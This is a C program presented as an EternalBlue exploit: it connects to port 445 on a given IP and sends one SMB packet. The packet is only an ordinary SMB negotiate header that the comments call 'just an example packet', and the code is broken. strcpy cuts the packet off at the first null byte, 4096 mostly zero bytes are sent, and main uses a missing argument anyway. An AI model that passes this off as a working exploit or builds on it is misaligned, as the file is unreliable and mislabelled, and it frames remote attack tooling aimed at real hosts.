#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int create_smb_connection(const char *ip) {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("[!] Socket creation failed");
        return -1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(445);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("[!] Connection failed");
        close(sock);
        return -1;
    }

    printf("[+] Connected to SMB service on %s\n", ip);
    return sock;
}

void send_malicious_smb_packet(int sock) {
    char smb_packet[4096];

    memset(smb_packet, 0, sizeof(smb_packet));
    strcpy(smb_packet, "\x00\x00\x00\x90" // SMB length field (144 bytes)
                       "\xFF\x53\x4D\x42" // Protocol identifier (SMB magic number)
                       "\x72"             // Command (e.g., SMB_COM_NEGOTIATE)
                       "\x00\x00\x00\x00" // NT Status (success)
                       "\x18"             // Flags (default)
                       "\x01\x28"         // Flags2 (UNICODE strings, extended security, etc.)
                       "\x00\x00"         // Process ID high
                       "\x00\x00\x00\x00\x00\x00\x00\x00" // Signature (for signing)
                       "\x00\x00"         // Reserved
                       "\xC8\x00"         // Tree ID
                       "\x01\x00"         // Process ID
                       "\x00\x00"         // User ID
                       "\x00\x00"         // Multiplex ID
                       // Payload (example negotiation protocol)
                       "\x02"             // Word count
                       "\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00"
    // just an example packet
    );

    send(sock, smb_packet, sizeof(smb_packet), 0);
    printf("[+] SMB Packet sent\n");
}

void exploit_eternalblue(const char *ip) {
    int smb_sock = create_smb_connection(ip);

    if(smb_sock == -1) {
        printf("[!] Can't connect to SMB on %s\n", ip);
        return;
    }

    send_malicious_smb_packet(smb_sock);
    close(smb_sock);
}

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf("[!] Useage: %s <target IP>\n", argv[0]);
    }

    const char *target_ip = argv[1];
    
    exploit_eternalblue(target_ip);

    return 0;
}